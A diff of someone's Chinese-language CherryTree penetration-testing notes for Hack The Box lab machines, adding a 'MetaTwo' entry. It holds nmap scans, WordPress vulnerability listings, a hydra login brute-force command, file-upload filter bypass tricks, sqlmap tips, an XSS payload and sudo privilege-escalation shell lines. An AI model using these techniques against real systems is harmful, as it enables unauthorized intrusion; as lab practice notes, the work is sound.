@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1677825425">
+  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1678071844">
     <rich_text scale="h3" weight="heavy">需要安装的脚本工具：</rich_text>
     <rich_text>
 
@@ -102,8 +102,8 @@ kernel:
     <rich_text scale="h3" weight="heavy">hack 步骤及常用操作</rich_text>
     <rich_text>
 
-• ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.194 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
-nmap -sC -sV -p $ports 10.10.11.194 -Pn
+• ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.186 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
+nmap -sC -sV -p $ports 10.10.11.186 -Pn
 扫描主机开放端口
 
 • 通过 ip 地址无法访问站点，尝试编辑 /etc/hosts 文件，添加 &lt;ip&gt; &lt;machine&gt;.htb 到文件中
@@ -331,7 +331,7 @@ fs             0x0                 0
 gs             0x0                 0
 </codebox>
   </node>
-  <node name="hack_operation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649905004" ts_lastsave="1677146150">
+  <node name="hack_operation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649905004" ts_lastsave="1678091686">
     <rich_text>1. 生成 rsa private key 并解密加密的文件
 ./RsaCtfTool.py --publickey ~/Weak_RSA/key.pub --uncipherfile ~/Weak_RSA/flag.enc --attack wiener --private
 
@@ -455,6 +455,9 @@ lrwxrwxrwx 1 root root 4 Sep  1 22:11 /bin/sh -&gt; </rich_text>
 16. xss
 &lt;img src=x onerror=alert()&gt;
 
+17. 在文件内容前加  GIF8; 用 file 命令查看文件，可以看出文件将被识别成 img 图片，对于图片上传检测绕过有用。还有后缀名绕过如 rev_shell.php.jpg。
+
+18. sqlmap 指定需要注入字段时，可用 -p id,name 。如果name="{"name":"abc"}",可用 * 来表示，如 name="{"name":"abc*"}"
 </rich_text>
   </node>
   <node name="linux" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675223633" ts_lastsave="1677641160">
@@ -4135,7 +4138,7 @@ uid=0(root) gid=0(root) groups=0(root)
     <codebox char_offset="4203" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo 'import os; os.execv("/bin/sh", ["sh"])' &gt;/usr/local/share/dstat/dstat_xxx.py
 sudo dstat --xxx</codebox>
   </node>
-  <node name="Precious" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677764121" ts_lastsave="1677845876">
+  <node name="Precious" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677764121" ts_lastsave="1678071809">
     <rich_text>1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.189 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
 nmap -sC -sV -p $ports 10.10.11.189 -Pn
 Starting Nmap 7.93 ( </rich_text>
@@ -4235,7 +4238,9 @@ end
     <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md</rich_text>
     <rich_text>
 
-
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
 
 修改 git_set: id  为   git_set</rich_text>
     <rich_text foreground="#bf2e5e">:</rich_text>
@@ -4271,6 +4276,105 @@ end
              git_set: chmod +s /bin/bash
          method_id: :resolve
 </codebox>
+  </node>
+  <node name="MetaTwo" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678071809" ts_lastsave="1678110811">
+    <rich_text>1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.186 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
+nmap -sC -sV -p $ports 10.10.11.186 -Pn
+Starting Nmap 7.93 ( </rich_text>
+    <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+    <rich_text> ) at 2023-03-06 11:06 CST
+Nmap scan report for 10.10.11.186
+Host is up (0.16s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to </rich_text>
+    <rich_text link="webs http://metapress.htb/">http://metapress.htb/</rich_text>
+    <rich_text>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at </rich_text>
+    <rich_text link="webs https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</rich_text>
+    <rich_text> :
+SF-Port21-TCP:V=7.93%I=7%D=3/6%Time=640558C2%P=x86_64-pc-linux-gnu%r(Gener
+SF:icLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.
+SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
+SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
+SF:r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+ |
+ | [!] Title: WP &lt; 6.0.3 - SQLi in WP_Date_Query
+ |     Fixed in: 5.6.10
+ |     References:
+ |      - </rich_text>
+    <rich_text link="webs https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47">https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47</rich_text>
+    <rich_text>
+ |      - </rich_text>
+    <rich_text link="webs https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/">https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/</rich_text>
+    <rich_text>
+ |      - </rich_text>
+    <rich_text link="webs https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f">https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f</rich_text>
+    <rich_text>
+
+
+[!] Title: WP &lt;= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
+ |     References:
+ |      - </rich_text>
+    <rich_text link="webs https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11">https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11</rich_text>
+    <rich_text>
+ |      - </rich_text>
+    <rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590</rich_text>
+    <rich_text>
+ |      - </rich_text>
+    <rich_text link="webs https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/">https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/</rich_text>
+    <rich_text>
+
+
+
+admin
+
+hydra -l admin -P 10k-most-common.txt </rich_text>
+    <rich_text link="webs http://metapress.htb/wp-login.php">metapress.htb</rich_text>
+    <rich_text> http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:H=User-Agent\:Mozilla/5.0 (X11; Linux x86_64; rv\:102.0) Gecko/20100101 Firefox/102.0:H=Accept\:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8:H=Origin\:</rich_text>
+    <rich_text link="webs http://metapress.htb">http\://metapress.htb</rich_text>
+    <rich_text>:H=Referer\:</rich_text>
+    <rich_text link="webs http://metapress.htb/wp-login.php">http\://metapress.htb/wp-login.php</rich_text>
+    <rich_text>:H=Upgrade-Insecure-Requests\:1:H=Cookie\:PHPSESSID=a83jpbg8tovuglvoe9bdd1vea5; wordpress_test_cookie=WP%20Cookie%20check:incorrect" -t 64 -V
+
+
+
+POST /wp-login.php HTTP/1.1&#13;
+Host: metapress.htb&#13;
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&#13;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#13;
+Accept-Language: en-US,en;q=0.5&#13;
+Accept-Encoding: gzip, deflate&#13;
+Referer: </rich_text>
+    <rich_text link="webs http://metapress.htb/wp-login.php">http://metapress.htb/wp-login.php</rich_text>
+    <rich_text>&#13;
+Content-Type: application/x-www-form-urlencoded&#13;
+Content-Length: 103&#13;
+Origin: </rich_text>
+    <rich_text link="webs http://metapress.htb">http://metapress.htb</rich_text>
+    <rich_text>&#13;
+Connection: close&#13;
+Cookie: PHPSESSID=a83jpbg8tovuglvoe9bdd1vea5; wordpress_test_cookie=WP%20Cookie%20check&#13;
+Upgrade-Insecure-Requests: 1&#13;
+&#13;
+log=admin&amp;pwd=adnmin&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&amp;testcookie=1</rich_text>
   </node>
   <node name="Legacy-Windows" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664271968" ts_lastsave="1675928583">
     <rich_text>1. nmap -sV -sC 10.10.10.4              
@@ -5236,8 +5340,9 @@ use msf ms16_014 succeed!
 root: 1e066f2cf41fdd44fea6556f90a3c017</rich_text>
     </node>
   </node>
-  <node name="Conceal" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1668863442" ts_lastsave="1675337855">
-    <rich_text>1. nmap -p- --min-rate 10000 10.10.10.116
+  <node name="Conceal" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1668863442" ts_lastsave="1678074128">
+    <rich_text>
+1. nmap -p- --min-rate 10000 10.10.10.116
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 21:12 CST
 Nmap scan report for 10.10.10.116
 Host is up (0.33s latency).
